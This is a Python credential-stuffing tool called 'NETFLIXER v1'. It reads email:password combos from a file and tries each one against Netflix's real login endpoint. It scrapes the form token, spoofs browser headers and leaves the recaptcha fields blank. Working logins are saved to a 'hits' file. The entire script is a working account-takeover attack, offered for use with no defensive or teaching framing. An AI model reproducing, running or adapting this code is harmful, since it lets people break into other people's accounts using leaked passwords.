import os,requests
from bs4 import BeautifulSoup as Soup

YELLOW = '\033[93m'
GREEN = '\033[32m'
RED = '\033[91m'
RESET = '\033[0m' 

def banner():
    os.system('cls && title [NETFLIXER v1] - Made by Plasmonix' if os.name == "nt" else 'clear') 
    text = """    
                       ███▄    █ ▓█████▄▄▄█████▓  █████▒██▓     ██▓▒██   ██▒▓█████  ██▀███  
                       ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒▓██   ▒▓██▒    ▓██▒▒▒ █ █ ▒░▓█   ▀ ▓██ ▒ ██▒
                      ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░▒████ ░▒██░    ▒██▒░░  █   ░▒███   ▓██ ░▄█ ▒
                      ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ ░▓█▒  ░▒██░    ░██░ ░ █ █ ▒ ▒▓█  ▄ ▒██▀▀█▄  
                      ▒██░   ▓██░░▒████▒ ▒██▒ ░ ░▒█░   ░██████▒░██░▒██▒ ▒██▒░▒████▒░██▓ ▒██▒
                      ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░    ▒ ░   ░ ▒░▓  ░░▓  ▒▒ ░ ░▓ ░░░ ▒░ ░░ ▒▓ ░▒▓░
                      ░ ░░   ░ ▒░ ░ ░  ░   ░     ░     ░ ░ ▒  ░ ▒ ░░░   ░▒ ░ ░ ░  ░  ░▒ ░ ▒░
                         ░   ░ ░    ░    ░       ░ ░     ░ ░    ▒ ░ ░    ░     ░     ░░   ░ 
                               ░    ░  ░                   ░  ░ ░   ░    ░     ░  ░   ░     """
    faded = ""
    red = 40
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
        if not red == 255:
            red += 15
            if red > 255:
                red = 255
    print(faded)
    print(YELLOW + "                                       github.com/Plasmonix Version 1.0 \n" + RESET)

banner()

def check_file():
    try :
        combolist = open("combo.txt", "r").readlines()
        for combos in combolist:
            email=combos.split(":")[0]
            password=combos.split(":")[1]
            check_account(email,password)
    except FileNotFoundError :
           print(RED + """ [ERROR] combo.txt not found """ + RESET)

def check_account(email,password):
    client = requests.Session()
    login = client.get("https://www.netflix.com/login")
    soup = Soup(login.text,'html.parser')
    loginForm = soup.find('form')
    authURL = loginForm.find('input', {'name': 'authURL'}).get('value')
    
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
        "accept-language": "en-US,en;q=0.9", 
        "accept-encoding": "gzip, deflate, br", 
        "referer": "https://www.netflix.com/login", 
        "content-type": "application/x-www-form-urlencoded",
        "cookie":""
    }

    data = {
        "userLoginId:": (email), 
        "password": (password), 
        "rememberMeCheckbox": "true", 
        "flow": "websiteSignUp", 
        "mode": "login", 
        "action": "loginAction", 
        "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode,recaptchaResponseToken,recaptchaError,recaptchaResponseTime", 
        "authURL": (authURL), 
        "nextPage": "https://www.netflix.com/browse",
        "countryCode": "+1",
        "countryIsoCode": "US",
        "recaptchaResponseToken": "",
        "recaptchaResponseTime": "473"
    }

    request = client.post("https://www.netflix.com/login",headers=headers,data=data)
    logged = request.text.find('name="authURL"')
    if logged == -1:
        print(GREEN +" [GOOD] {}:{} ".format(email,password) + RESET)
        file = open("hits.txt","a")
        file.write(email + ":" + password)
    else:
        print(RED +" [BAD] {}:{} ".format(email,password) + RESET)

if __name__ == "__main__":
    check_file()
